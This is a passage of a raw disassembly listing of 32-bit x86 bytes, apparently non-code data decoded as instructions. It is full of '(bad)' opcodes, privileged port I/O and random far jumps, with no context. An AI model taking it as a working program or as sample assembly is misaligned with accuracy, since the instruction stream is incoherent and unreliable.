  425bae:	and    DWORD PTR [edx+0x2bb01f6b],ecx
  425bb4:	dec    edx
  425bb5:	mov    BYTE PTR [ebx-0x2],0xd1
  425bb9:	int3   
  425bba:	imul   edx,DWORD PTR [esp+edx*1+0x77],0xd7d235dc
  425bc2:	aaa    
  425bc3:	pop    ebx
  425bc4:	cli    
  425bc5:	outs   dx,BYTE PTR ds:[esi]
  425bc6:	sti    
  425bc7:	iret   
  425bc8:	stos   BYTE PTR es:[edi],al
  425bc9:	or     bl,BYTE PTR [ebp+0x7e]
  425bcc:	lsl    ebp,WORD PTR [edi-0x69b4e39e]
  425bd3:	fnstenv [edx+eiz*4]
  425bd6:	dec    edi
  425bd7:	xchg   DWORD PTR [ebp+0x64],ecx
  425bda:	push   cs
  425bdb:	and    ecx,ecx
  425bdd:	dec    edi
  425bde:	or     al,0x29
  425be0:	mov    dl,0x29
  425be2:	add    BYTE PTR [edi-0x15f79b1b],ah
  425be8:	je     0x425bb9
  425bea:	lds    ecx,FWORD PTR [edi]
  425bec:	inc    esi
  425bed:	es jmp 0xb6f7:0x32da3a5c
  425bf5:	mov    al,ds:0xe9dcf72a
  425bfa:	lea    eax,[edx+0x22c3f0ad]
  425c00:	xchg   edi,eax
  425c01:	sub    DWORD PTR [eax+0x64f3b67],ecx
  425c07:	int    0x44
  425c09:	xor    eax,0x78b63b0d
  425c0e:	sub    esp,DWORD PTR [ebp-0x7f74eec0]
  425c14:	sub    eax,0xf75a2b02
  425c19:	fadd   DWORD PTR [ebx-0xc132235]
  425c1f:	aam    0xd7
  425c21:	daa    
  425c22:	es mov al,0xfd
  425c25:	or     cl,bh
  425c27:	shl    DWORD PTR [esi+0x5f],cl
  425c2a:	adc    eax,0x9cf5a928
  425c2f:	pop    edx
  425c30:	sahf   
  425c31:	mov    ebx,0xe0f0820d
  425c36:	shl    BYTE PTR [ecx+0x136eff96],1
  425c3c:	cmp    ah,dl
  425c3e:	into   
  425c3f:	jns    0x425ca1
  425c41:	fst    QWORD PTR [eax+0x69]
  425c44:	adc    eax,0xb0da4c2d
  425c49:	dec    ecx
  425c4a:	sbb    al,0x4c
  425c4c:	sub    ebx,DWORD PTR [esi]
  425c4e:	pop    eax
  425c4f:	sbb    cl,BYTE PTR [eax]
  425c51:	sbb    eax,0xfce93ad
  425c56:	xchg   ecx,eax
  425c57:	scas   eax,DWORD PTR es:[edi]
  425c58:	stos   DWORD PTR es:[edi],eax
  425c59:	sbb    DWORD PTR [edx+0x4f017794],esi
  425c5f:	cwde   
  425c60:	mov    DWORD PTR [ebx],edx
  425c62:	xor    BYTE PTR [edi+0x45],al
  425c65:	mov    ebx,0x8a33be34
  425c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c6b:	sub    bl,dh
  425c6d:	pop    esp
  425c6e:	sub    BYTE PTR [ecx],ch
  425c70:	cmp    eax,0x99c62a35
  425c75:	fsubr  DWORD PTR ds:[esp+eax*8+0x284154d1]
  425c7d:	push   0x42de17a7
  425c82:	fsub   QWORD PTR [ebp-0x6b3cc14c]
  425c88:	jae    0x425c76
  425c8a:	xchg   edi,eax
  425c8b:	loope  0x425c55
  425c8d:	ins    DWORD PTR es:[edi],dx
  425c8e:	popa   
  425c8f:	mov    ds:0x6aeac5e0,eax
  425c94:	repz aas 
  425c96:	arpl   WORD PTR [eax+0x70],sp
  425c99:	sub    ah,ch
  425c9b:	fs or  al,0xed
  425c9f:	jl     0x425cfb
  425ca1:	jle    0x425c42
  425ca3:	inc    eax
  425ca4:	inc    ebp
  425ca5:	sub    al,0x86
  425ca7:	fcom   DWORD PTR [ecx+eiz*4+0x62]
  425cab:	mov    BYTE PTR [ebx],al
  425cad:	mov    bl,0x56
  425caf:	sbb    edi,DWORD PTR [edi+0x77]
  425cb2:	loop   0x425d23
  425cb4:	mov    dl,0x9d
  425cb6:	cwde   
  425cb7:	mov    bl,0xea
  425cb9:	inc    ebx
  425cba:	retf   
  425cbb:	mov    ch,BYTE PTR [ebx]
  425cbd:	ffreep st(2)
  425cbf:	mov    al,ds:0x62b0c947
  425cc4:	xor    al,0x31
  425cc6:	test   BYTE PTR [edi-0x73],ah
  425cc9:	push   esp
  425cca:	gs pop edi
  425ccc:	mov    esp,0x28d95b9b
  425cd1:	int    0x5
  425cd3:	stc    
  425cd4:	popa   
  425cd5:	enter  0x9b26,0x1f
  425cd9:	add    DWORD PTR [edi],esi
  425cdb:	xchg   esp,eax
  425cdc:	scas   al,BYTE PTR es:[edi]
  425cdd:	pop    edi
  425cde:	stos   BYTE PTR es:[edi],al
  425cdf:	add    eax,0x905d8c55
  425ce4:	pop    edi
  425ce5:	push   ebp
  425ce6:	mov    ah,0x6
  425ce8:	dec    eax
  425ce9:	fldenv [eax]
  425ceb:	int    0xa3
  425ced:	dec    eax
  425cee:	or     al,0x80
  425cf0:	jno    0xfed50a5e
  425cf6:	adc    BYTE PTR [ecx+0x37e9de23],al
  425cfc:	loop   0x425cca
  425cfe:	clc    
  425cff:	mov    bl,0xa2
  425d01:	inc    esp
  425d02:	inc    edx
  425d03:	shl    DWORD PTR [edx-0x2dd76f12],0xe5
  425d0a:	push   ebp
  425d0b:	mov    edi,0x40c1454e
  425d10:	jl     0x425c9e
  425d12:	pop    ss
  425d13:	fsubr  st,st(7)
  425d15:	aas    
  425d16:	not    BYTE PTR [ecx-0x57b6c39]
  425d1c:	out    dx,al
  425d1d:	mov    eax,ds:0x9a794bd7
  425d22:	and    ch,BYTE PTR [edi]
  425d24:	cli    
  425d25:	das    
  425d26:	lahf   
  425d27:	pop    ebx
  425d28:	arpl   WORD PTR [ebp+0x52],sp
  425d2b:	imul   eax,DWORD PTR [esi+0xe],0x78838e38
  425d32:	mov    esp,0x374d4ce8
  425d37:	fsub   QWORD PTR [ecx-0x4fffff6b]
  425d3d:	mov    ch,al
  425d3f:	cmp    edx,0x62bbf9e3
  425d45:	and    BYTE PTR [ecx+ebx*4],ah
  425d48:	xor    eax,0xcd0602c
  425d4d:	(bad)  
  425d4e:	add    DWORD PTR [eax],eax
  425d50:	xchg   BYTE PTR [edx],al
  425d52:	add    BYTE PTR [eax],al
  425d54:	int3   
  425d55:	imul   edx,DWORD PTR [ebx+eax*4],0xbdb1d31f
  425d5c:	xchg   DWORD PTR [ebp+0x3d391138],eax
  425d62:	out    dx,al
  425d63:	bound  eax,QWORD PTR [edi+0x456d8555]
  425d69:	xchg   edi,eax
  425d6a:	or     al,dh
  425d6c:	je     0x425d3f
  425d6e:	cmp    bh,BYTE PTR [esi+eax*2]
  425d71:	sub    DWORD PTR [ecx+esi*8],ecx
  425d74:	push   esi
  425d75:	and    ebx,DWORD PTR [edx+edi*1]
  425d78:	stc    
  425d79:	(bad)  
  425d7a:	popf   
  425d7b:	data16 aaa 
  425d7d:	xlat   BYTE PTR ds:[ebx]
  425d7e:	dec    esi
  425d7f:	pushf  
  425d80:	pop    ss
  425d81:	nop
  425d82:	in     al,dx
  425d83:	add    BYTE PTR [edx-0x114718cd],al
  425d89:	mov    ecx,0x53bae2cb
  425d8e:	popf   
  425d8f:	mov    ebp,0xaac3105e
  425d94:	sub    DWORD PTR [esi+0x709916f],edi
  425d9a:	fst    QWORD PTR [edx+0x1d4f16f9]
  425da0:	mov    cs,WORD PTR [edx-0x1e7d970]
  425da6:	jmp    0x425de0
  425da8:	jo     0x425dd6
  425daa:	mov    es:0x41ca8a15,al
  425db0:	jle    0x425deb
  425db2:	xchg   ebp,eax
  425db3:	in     eax,0x2e
  425db5:	xlat   BYTE PTR ds:[ebx]
  425db6:	scas   eax,DWORD PTR es:[edi]
  425db7:	bound  edi,QWORD PTR [ebp+0x3d3e01d9]
  425dbd:	or     cl,ah
  425dbf:	mov    ebx,0xb4469c3a
  425dc4:	add    DWORD PTR [eax-0x50],ecx
  425dc7:	es fcos 
  425dca:	mov    ebp,0xd88d1b7a
  425dcf:	push   ebp
  425dd0:	xchg   ecx,eax
  425dd1:	cmc    
  425dd2:	test   DWORD PTR [eax+eiz*8],ebp
  425dd5:	dec    ebx
  425dd6:	popf   
  425dd7:	cmp    eax,0x1ca875b7
  425ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ddd:	inc    edi
  425dde:	jbe    0x425e5f
  425de0:	call   0x51dd:0x307a730
  425de7:	sub    al,0xd0
  425de9:	lds    ebx,FWORD PTR [ebp-0x64]
  425dec:	jmp    FWORD PTR [ebx-0x772116b0]
  425df2:	retf   
  425df3:	inc    ebp
  425df4:	mov    eax,ds:0x704e7b28
  425df9:	pusha  
  425dfa:	dec    ebp
  425dfb:	mov    ecx,0xce969eec
  425e00:	icebp  
  425e01:	or     BYTE PTR [ecx-0x7d],ch
  425e04:	xchg   dh,ah
  425e06:	outs   dx,DWORD PTR ds:[esi]
  425e07:	adc    al,BYTE PTR [edi-0x49]
  425e0a:	pop    eax
  425e0b:	ins    BYTE PTR es:[edi],dx
  425e0c:	pop    ebp
  425e0d:	(bad)  
  425e0f:	aas    
  425e10:	mov    eax,ds:0xf74cd1aa
  425e15:	imul   esi,DWORD PTR [edx-0x4a828a8f],0xffffffb4
  425e1c:	sub    DWORD PTR [ecx+0xbbd4f5a],0x1602a516
  425e26:	enter  0xab2f,0x6f
  425e2a:	or     DWORD PTR [ebx],esi
  425e2c:	or     ch,ch
  425e2e:	mov    ebp,0x96ac60a9
  425e33:	mov    dh,0xc5
  425e35:	lds    ebx,FWORD PTR [ebx]
  425e37:	fist   DWORD PTR [ecx+0x61eff920]
  425e3d:	xchg   ebp,eax
  425e3e:	repnz iret 
  425e40:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  425e42:	mov    ebx,0xd5a0f801
  425e47:	repnz adc BYTE PTR [ecx+edi*1-0x16],al
  425e4c:	jl     0x425e4d
  425e4e:	out    0x41,al
  425e50:	outs   dx,BYTE PTR ds:[esi]
  425e51:	and    al,0x1c
  425e53:	retf   0xd9ce
  425e56:	inc    edi
  425e57:	ror    ah,1
  425e59:	cdq    
  425e5a:	inc    edi
  425e5b:	jecxz  0x425eb2
  425e5d:	ja     0x425e3c
  425e5f:	jle    0x425ed9
  425e61:	fdivr  st,st(5)
  425e63:	or     BYTE PTR [eax-0x6b],bl
  425e66:	nop
  425e67:	sbb    eax,0x19462dc2
  425e6c:	lock cmp esp,DWORD PTR ds:0x5abe99f3
  425e73:	pop    ebp
  425e74:	test   DWORD PTR [eax-0x56],edi
  425e77:	dec    edx
  425e78:	scas   eax,DWORD PTR es:[edi]
  425e79:	jo     0x425e79
  425e7b:	out    dx,al
  425e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e7d:	push   ss
  425e7e:	rol    DWORD PTR [esi],0xbd
  425e81:	bound  ebx,QWORD PTR [ebx+0x26]
  425e84:	add    DWORD PTR [esi+edi*2-0x4a],0xbf5785e1
  425e8c:	addr16 mov ebx,0x176f32cc
  425e92:	test   eax,0x2be42ecc
  425e97:	pop    edx
  425e98:	or     edi,DWORD PTR [edi-0x2aa89a9f]
  425e9e:	cmp    ebp,0x83b217c5
  425ea4:	fbstp  TBYTE PTR [edx-0x257a83c]
  425eaa:	or     BYTE PTR [ebx+0x1474703e],bh
  425eb0:	std    
  425eb1:	jle    0x425e80
  425eb3:	xchg   edx,eax
  425eb4:	mov    esp,DWORD PTR [edx+edx*1]
  425eb7:	(bad)  
  425eb8:	ins    BYTE PTR es:[edi],dx
  425eb9:	mov    ah,0x78
  425ebb:	adc    eax,0x989f5cd6
  425ec0:	pop    esi
  425ec1:	adc    ch,dh
  425ec3:	fs daa 
  425ec5:	pop    es
  425ec6:	fwait
  425ec7:	rcr    ebx,1
  425ec9:	ficomp DWORD PTR [ebx]
  425ecb:	and    cl,ah
  425ecd:	mov    ds,WORD PTR [esi]
  425ecf:	test   al,0xf6
  425ed1:	call   0x434e:0xc8820784
  425ed8:	mov    ebp,0xcc76e356
  425edd:	loop   0x425f59
  425edf:	femms  
  425ee1:	pop    es
  425ee2:	aad    0x4b
  425ee4:	jne    0x425e85
  425ee6:	jmp    0x425eba
  425ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ee9:	push   eax
  425eea:	jl     0x425e78
  425eec:	and    dl,ch
  425eee:	inc    esi
  425eef:	jle    0x425e81
  425ef1:	dec    ebp
  425ef2:	leave  
  425ef3:	dec    DWORD PTR [ebp-0x8]
  425ef6:	mov    ebx,0xdc889ce9
  425efb:	dec    eax
  425efc:	mov    al,ds:0xb376a97c
  425f01:	adc    eax,ebx
  425f03:	arpl   WORD PTR [edi+esi*8-0x630c7c8e],di
  425f0a:	dec    eax
  425f0b:	sbb    DWORD PTR ds:0xf5ba9765,eax
  425f11:	mov    ebx,0x662cf73e
  425f16:	pop    ecx
  425f17:	nop
  425f18:	pop    esi
  425f19:	jecxz  0x425ea8
  425f1b:	cmp    ebp,ecx
  425f1d:	or     al,0x44
  425f1f:	dec    edx
  425f20:	lock retf 
  425f22:	ss repz call 0xb9189e5c
  425f29:	mov    al,0x6f
  425f2b:	cmp    eax,0x2cb5d448
  425f30:	sbb    cl,BYTE PTR [edi+0x1b]
  425f33:	js     0x425fb4
  425f35:	adc    edx,DWORD PTR [edx+0x41b6e1ef]
  425f3b:	dec    ebp
  425f3c:	push   eax
  425f3d:	xor    al,cl
  425f3f:	mov    cs,ecx
  425f41:	mov    al,ds:0x52c49d76
  425f46:	xor    BYTE PTR [eax+0x701076a5],ch
  425f4c:	aam    0xf5
  425f4e:	pop    edi
  425f4f:	sbb    DWORD PTR [ebx],esp
  425f51:	fwait
  425f52:	inc    ebx
  425f53:	cmp    al,0xaf
  425f55:	sbb    al,0xa0
  425f57:	mov    esp,0x371e2bfc
  425f5c:	jp     0x425f7f
  425f5e:	mov    ch,0xb4
  425f60:	out    0x6a,al
  425f62:	xor    edi,ebp
  425f64:	ficomp WORD PTR [eax]
  425f66:	xor    al,BYTE PTR [eax-0x2befa520]
  425f6c:	or     al,0x55
  425f6e:	lods   al,BYTE PTR ds:[esi]
  425f6f:	jmp    0x928b759c
  425f74:	xchg   BYTE PTR fs:[edi],bl
  425f77:	cmp    BYTE PTR [eax],ah
  425f79:	and    cl,BYTE PTR [eax]
  425f7b:	shl    DWORD PTR [ebx-0x5f],1
  425f7e:	mov    DWORD PTR [esi],esi
  425f80:	shr    DWORD PTR [esi+0x47976af1],0x53
  425f87:	in     al,0xb6
  425f89:	lods   eax,DWORD PTR ds:[esi]
  425f8a:	xchg   ebx,eax
  425f8b:	test   eax,0xb830145e
  425f90:	addr16 push cs
  425f92:	dec    esp
  425f93:	add    dl,ch
  425f95:	pop    esi
  425f96:	or     DWORD PTR es:[eax],esp
  425f99:	adc    ebp,0xc54f73d1
  425f9f:	into   
  425fa0:	mov    bl,0x20
  425fa2:	dec    ebp
  425fa3:	je     0x425f7e
  425fa5:	pop    ss
  425fa6:	rcr    BYTE PTR [edx+0x27],cl
  425fa9:	sbb    bh,dl
  425fab:	sar    ah,cl
  425fad:	aam    0xda
  425faf:	sub    edx,0x13
  425fb2:	sub    BYTE PTR [eax],0x1b
  425fb5:	inc    edi
  425fb6:	pop    eax
  425fb7:	adc    al,0x1c
  425fb9:	fmul   DWORD PTR ss:[edx+0x3035b54d]
  425fc0:	xchg   edx,ecx
  425fc2:	sub    DWORD PTR [eax-0x19],edx
  425fc5:	cs es in al,0xe3
  425fc9:	and    al,0x1f
  425fcb:	and    eax,0xcea75936
  425fd0:	dec    ebp
  425fd1:	cld    
  425fd2:	xchg   esp,eax
  425fd3:	push   ebp
  425fd4:	xor    ch,BYTE PTR [ecx-0x2e]
  425fd7:	mov    ebx,0xfd17
  425fdc:	mov    cl,BYTE PTR [esp+eax*8-0x61253926]
  425fe3:	fsubr  st(7),st
  425fe5:	sub    DWORD PTR [ecx],0xffffff8c
  425fe8:	sbb    ah,BYTE PTR [edi-0x73]
  425feb:	rcl    BYTE PTR [edx-0x79fffe28],1
  425ff1:	add    al,BYTE PTR [eax]
  425ff3:	add    bl,cl
  425ff5:	mov    ecx,0x2ec9ff32
  425ffa:	push   cs
  425ffb:	(bad)  
  425ffc:	js     0x425fd8
  425ffe:	xchg   esi,eax
  425fff:	push   eax
  426000:	dec    ebp
  426001:	adc    edx,esp
  426003:	sbb    al,0x40
  426005:	mov    dl,0x4a
  426007:	sar    DWORD PTR [ecx+0x44],1
  42600a:	cwde   
  42600b:	pop    esi
  42600c:	arpl   WORD PTR [ecx],di
  42600e:	inc    esp
  42600f:	sub    BYTE PTR [eax*1+0x11f6803a],0x82
  426017:	jno    0x425fae
  426019:	int    0xec
  42601b:	std    
  42601c:	xchg   ebx,eax
  42601d:	loopne 0x42607d
  42601f:	fiadd  DWORD PTR [eax-0xadc0e05]
  426025:	xor    BYTE PTR ss:[ecx-0x24dd9c01],al
  42602c:	repnz push eax
  42602e:	mov    BYTE PTR [ecx],dh
  426030:	clc    
  426031:	push   ecx
  426032:	jae    0x425ffc
  426034:	(bad)  
  426035:	loop   0x42601a
  426037:	inc    eax
  426038:	packuswb mm1,QWORD PTR [eax]
  42603b:	test   BYTE PTR [ebx],bl
  42603d:	mov    ecx,0xba48b089
  426042:	add    ch,BYTE PTR [edi+0x2e]
  426045:	cli    
  426046:	gs jb  0x426088
  426049:	loop   0x426005
  42604b:	sub    ecx,DWORD PTR [ebx-0x5f5a0614]
  426051:	leave  
  426052:	mov    ah,0xc4
  426054:	adc    ecx,DWORD PTR [ecx-0x694e4077]
  42605a:	inc    ecx
  42605b:	cwde   
  42605c:	(bad)  
  42605d:	dec    ebp
  42605e:	gs in  eax,0xbe
  426061:	pusha  
  426062:	xchg   ebx,eax
  426063:	adc    esp,DWORD PTR cs:0x9a6c52f8
  42606a:	mov    dh,BYTE PTR [edx]
  42606c:	sahf   
  42606d:	add    bh,BYTE PTR [edi+0x7b]
  426070:	sbb    dl,BYTE PTR [edx+ecx*1+0x7687b8ad]
  426077:	pusha  
  426078:	push   esi
  426079:	push   cs
  42607a:	or     DWORD PTR [ebx-0x10eaaded],ecx
  426080:	dec    ebp
  426081:	js     0x426053
  426083:	in     al,0x82
  426085:	pop    ds
  426086:	sbb    ch,0xef
  426089:	mov    eax,ds:0x38046415
  42608e:	aas    
  42608f:	pop    eax
  426090:	dec    ecx
  426091:	sbb    ah,0x5c
  426094:	sbb    ebp,ebx
  426096:	push   esp
  426097:	pop    eax
  426098:	jmp    0x426119
  42609a:	dec    edi
  42609b:	xor    BYTE PTR [ecx],al
  42609d:	clc    
  42609e:	ins    DWORD PTR es:[edi],dx
  42609f:	cli    
  4260a0:	sti    
  4260a1:	xor    eax,DWORD PTR [ebx-0x4e]
  4260a4:	ret    0xe256
  4260a7:	jp     0x42602d
  4260a9:	push   cs
  4260aa:	pop    es
  4260ab:	sub    BYTE PTR [edx+0x5170c56d],cl
  4260b1:	pusha  
  4260b2:	dec    ebp
  4260b3:	push   ecx
  4260b4:	add    BYTE PTR [edx],bh
  4260b6:	pop    esi
  4260b7:	hlt    
  4260b8:	jno    0x426110
  4260ba:	and    ebp,esp
  4260bc:	jecxz  0x426117
  4260be:	pop    eax
  4260bf:	scas   al,BYTE PTR es:[edi]
  4260c0:	sti    
  4260c1:	xor    al,0xce
  4260c3:	ss jno 0x42606d
  4260c6:	imul   edx,DWORD PTR [ebx+0x339f604a],0xe62abd17
  4260d0:	add    BYTE PTR [edx],0x11
  4260d3:	mov    ecx,0xc696994a
  4260d8:	dec    ebp
  4260d9:	adc    eax,0x657b58e8
  4260de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260df:	adc    eax,0xed1665ab
  4260e4:	jge    0x4260ac
  4260e6:	push   edi
  4260e7:	dec    esp
  4260e8:	stc    
  4260e9:	aad    0xa6
  4260eb:	xchg   edx,eax
  4260ec:	xor    eax,0x3dd6c50
  4260f1:	rol    bh,1
  4260f3:	lods   al,BYTE PTR ds:[esi]
  4260f4:	ins    DWORD PTR es:[edi],dx
  4260f5:	or     al,0x19
  4260f7:	jb     0x426169
  4260f9:	ins    BYTE PTR es:[edi],dx
  4260fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260fb:	push   es
  4260fc:	inc    ebx
  4260fd:	jbe    0x426145
  4260ff:	pop    cx
  426101:	cwde   
  426102:	jmp    0x2b1227de
  426107:	imul   ecx,DWORD PTR [edi-0x5e],0xb239798a
  42610e:	sbb    al,0xfa
  426110:	lods   al,BYTE PTR ds:[esi]
  426111:	jne    0x426106
  426113:	retf   
  426114:	(bad)  
  426115:	popf   
  426116:	scas   eax,DWORD PTR es:[edi]
  426117:	ror    BYTE PTR [ebx+0x5aaba8f1],1
  42611d:	xor    DWORD PTR [ecx+ebp*1],0x0
  426121:	xchg   esp,eax
  426122:	std    
  426123:	jns    0x4260f2
  426125:	test   al,0x38
  426127:	xor    DWORD PTR [ecx+0x1b48ab7e],0xffffffdb
  42612e:	xor    esp,DWORD PTR [edi]
  426130:	sbb    DWORD PTR [esi-0x65],0x33
  426134:	in     eax,dx
  426135:	inc    edi
  426136:	popf   
  426137:	lahf   
  426138:	push   ecx
  426139:	mov    bl,0xa7
  42613b:	mov    edi,0x7c2a0228
  426140:	xlat   BYTE PTR ds:[ebx]
  426141:	inc    eax
  426142:	pushf  
  426143:	in     al,dx
  426144:	pop    ds
  426145:	and    eax,0xd1ffc5b9
  42614a:	into   
  42614b:	mov    eax,0x9922df03
  426150:	stos   BYTE PTR es:[edi],al
  426151:	xor    dl,BYTE PTR [edi]
  426153:	gs out dx,al
  426155:	mov    eax,ds:0x10393af4
  42615a:	test   BYTE PTR [edx],0xdc
  42615d:	mov    esi,0x32ba803a
  426162:	fcomip st,st(4)
  426164:	psllq  mm4,QWORD PTR [ecx]
  426167:	mov    bl,0xbd
  426169:	mov    ch,0xe3
  42616b:	mov    WORD PTR [eax],gs
  42616d:	fmul   QWORD PTR [ebp-0x43cc9b7d]
  426173:	div    DWORD PTR [eax-0x161840ab]
  426179:	and    eax,0xff5dfc7e
  42617e:	outs   dx,DWORD PTR ds:[esi]
  42617f:	jb     0x426193
  426181:	add    ebx,edx
  426183:	pop    esi
  426184:	lods   al,BYTE PTR ds:[esi]
  426185:	rol    esp,cl
  426187:	mov    dh,0x64
  426189:	int    0x80
  42618b:	push   0x5e
  42618d:	lds    esp,FWORD PTR [eax]
  42618f:	push   esp
  426190:	jl     0x4261a0
  426192:	mov    bl,0x51
  426194:	mul    DWORD PTR [edi]
  426196:	hlt    
  426197:	cli    
  426198:	push   cs
  426199:	jae    0x42620e
  42619b:	jnp    0x42619b
  42619d:	outs   dx,BYTE PTR fs:[si]
  4261a0:	mov    ebx,0xe1e51cb0
  4261a5:	aad    0xf5
  4261a7:	sbb    bl,BYTE PTR [ebx+0x2344dbce]
  4261ad:	push   eax
  4261ae:	mov    al,0x17
  4261b0:	sub    esi,edx
  4261b2:	inc    edx
  4261b3:	pop    ss
  4261b4:	mov    edi,0x3930a7fe
  4261b9:	lods   al,BYTE PTR ss:[esi]
  4261bb:	loop   0x4261e1
  4261bd:	mov    ecx,0xce7b2d86
  4261c2:	outs   dx,BYTE PTR ds:[esi]
  4261c3:	push   esp
  4261c4:	lock fld QWORD PTR [esi-0x7f]
  4261c8:	cld    
  4261c9:	arpl   WORD PTR [edi],bp
  4261cb:	mov    eax,DWORD PTR [esi]
  4261cd:	cs jnp 0x4261d1
  4261d0:	or     eax,0xec38fb88
  4261d5:	push   ss
  4261d6:	inc    BYTE PTR [edi+0x271dc264]
  4261dc:	mov    bh,0xc3
  4261de:	inc    edx
  4261df:	int3   
  4261e0:	inc    ebx
  4261e1:	push   ecx
  4261e2:	call   FWORD PTR [ebp+ebx*8-0xe782399]
  4261e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261ea:	mov    ds:0x2cbe2447,eax
  4261ef:	xchg   ecx,eax
  4261f0:	xchg   ecx,eax
  4261f1:	sbb    BYTE PTR [ecx],0xa6
  4261f4:	int    0x1c
  4261f6:	hlt    
  4261f7:	rcl    DWORD PTR [ecx],cl
  4261f9:	dec    ebx
  4261fa:	xor    al,0x6e
  4261fc:	sar    ebp,0xc7
  4261ff:	dec    DWORD PTR [ecx-0x4b47ff9c]
  426205:	xor    bh,ah
  426207:	std    
  426208:	mov    bh,0x7e
  42620a:	es sub dh,bh
  42620d:	std    
  42620e:	mov    BYTE PTR [ebx+0x49ec3e9d],bl
  426214:	sahf   
  426215:	add    BYTE PTR [eax+esi*8],dl
  426218:	sahf   
  426219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42621a:	lock push ss
  42621c:	add    eax,0x5728a2bd
  426221:	xchg   ebp,eax
  426222:	xchg   esp,eax
  426223:	ss inc edx
  426225:	imul   ebp,DWORD PTR [eax],0x8405450f
  42622b:	outs   dx,DWORD PTR ds:[esi]
  42622c:	test   DWORD PTR [eax+0x6859ddf5],ebx
  426232:	ror    DWORD PTR [esi-0x45b701b3],cl
  426238:	cmp    ah,0x47
  42623b:	dec    edi
  42623c:	jb     0x426236
  42623e:	xchg   esi,eax
  42623f:	mov    eax,0x9366cdc5
  426244:	jae    0x42625d
  426246:	and    ah,al
  426248:	jo     0x4261db
  42624a:	mov    al,0x4b
  42624c:	ror    bl,1
  42624e:	mov    ah,0x1d
  426250:	(bad)  [eax]
  426252:	sbb    eax,DWORD PTR [eax]
  426254:	mov    ds:0xe9945089,eax
  426259:	mov    cl,0xd1
  42625b:	mov    esi,0x67ec460b
  426260:	aas    
  426261:	or     al,0xc9
  426263:	xchg   ebp,eax
  426264:	jl     0x426238
  426266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426267:	and    BYTE PTR [ebp-0x18],ah
  42626a:	js     0x4262df
  42626c:	pop    ds
  42626d:	icebp  
  42626e:	popa   
  42626f:	xchg   ecx,eax
  426270:	cmp    DWORD PTR [eax],edi
  426272:	test   eax,0x6b8a7eb
  426277:	and    DWORD PTR [esi],edx
  426279:	retf   
  42627a:	add    BYTE PTR [eax],al
  42627c:	inc    eax
  42627d:	stos   BYTE PTR es:[edi],al
  42627e:	pop    edx
  42627f:	sbb    bh,dl
  426281:	cli    
  426282:	inc    eax
  426283:	cli    
  426284:	outs   dx,BYTE PTR ds:[esi]
  426285:	jmp    0x93:0xa0a6e400
  42628c:	sbb    bl,bl
  42628e:	add    DWORD PTR [eax],eax
  426290:	xchg   BYTE PTR [edx],al
  426292:	add    BYTE PTR [eax],al
  426294:	xor    edi,DWORD PTR [eax]
  426296:	sqrtps xmm0,xmm3
  426299:	xchg   esi,eax
  42629a:	lods   al,BYTE PTR ds:[esi]
  42629b:	jbe    0x4262e7
  42629d:	les    edi,FWORD PTR [ebp+0x35]
  4262a0:	jge    0x426285
  4262a2:	pusha  
  4262a3:	rcl    DWORD PTR [edx+eiz*4+0x15],1
  4262a7:	sub    eax,esi
  4262a9:	push   0xffffff8f
  4262ab:	jbe    0x4262fa
  4262ad:	pushf  
  4262ae:	arpl   WORD PTR [ebx],cx
  4262b0:	paddw  mm4,mm4
  4262b3:	shl    DWORD PTR [ecx],1
  4262b5:	sbb    cl,BYTE PTR [esi+0x74]
  4262b8:	pushf  
  4262b9:	inc    DWORD PTR [edx-0x40]
  4262bc:	xor    cl,bh
  4262be:	xor    bl,BYTE PTR [edi]
  4262c0:	push   edi
  4262c1:	rcr    BYTE PTR [edx-0x25114d79],0xd4
  4262c8:	sbb    DWORD PTR [eax+0x49],edx
  4262cb:	repz pushf 
  4262cd:	xchg   BYTE PTR [eax+0x4930a0b8],dh
  4262d3:	into   
  4262d4:	mov    ch,0x69
  4262d6:	pop    es
  4262d7:	xor    BYTE PTR [ecx+0x48],dh
  4262da:	push   ebx
  4262db:	jb     0x426275
  4262dd:	push   esi
  4262de:	enter  0x1a5d,0x6
  4262e2:	push   DWORD PTR [ebx+0x6d]
  4262e5:	cwde   
  4262e6:	jae    0x426292
  4262e8:	mov    bl,0x25
  4262ea:	jle    0x426362
  4262ec:	push   esi
  4262ed:	and    al,0x62
  4262ef:	add    ebx,ebx
  4262f1:	rcr    DWORD PTR [edx-0x74],1
  4262f4:	jbe    0x426282
  4262f6:	ss mov ecx,0x8a32b7f
  4262fc:	jg     0x426351
  4262fe:	inc    esi
  4262ff:	adc    al,0x40
  426301:	xor    cl,bh
  426303:	jmp    0x36dd:0x771d83ec
  42630a:	adc    eax,edi
  42630c:	fidivr DWORD PTR [ebx+0x68]
  42630f:	mov    DWORD PTR [esi-0x561b9fba],0x7e314cd8
  426319:	ret    
  42631a:	in     eax,0x5f
  42631c:	jnp    0x4262d0
  42631e:	push   edi
  42631f:	loop   0x426342
  426321:	mov    dl,0x3d
  426323:	jge    0x4262c4
  426325:	std    
  426326:	inc    BYTE PTR [edx+0x28]
  426329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	js     0x42634b
  42632c:	dec    ebx
  42632d:	daa    
  42632e:	sub    ebp,DWORD PTR [ebx-0x183b25ae]
  426334:	stos   BYTE PTR es:[edi],al
  426335:	jmp    0xeba8:0x1a8e6322
  42633c:	sub    eax,0x31f55d2b
  426341:	sbb    cl,BYTE PTR [edi+0x4b0a666]
  426347:	and    ebp,esi
  426349:	fsubr  st,st(7)
  42634b:	inc    esp
  42634c:	dec    DWORD PTR [eax-0x47]
  42634f:	jne    0x4263b0
  426351:	aam    0x69
  426353:	and    al,0xe5
  426355:	and    ebx,DWORD PTR [edx-0x1c]
  426358:	gs int3 
  42635a:	int3   
  42635b:	mov    dh,0xea
  42635d:	and    eax,0x1c534cb8
  426362:	push   0xffffff95
  426364:	sbb    DWORD PTR [ebx],ecx
  426366:	das    
  426367:	sub    dh,dl
  426369:	inc    sp
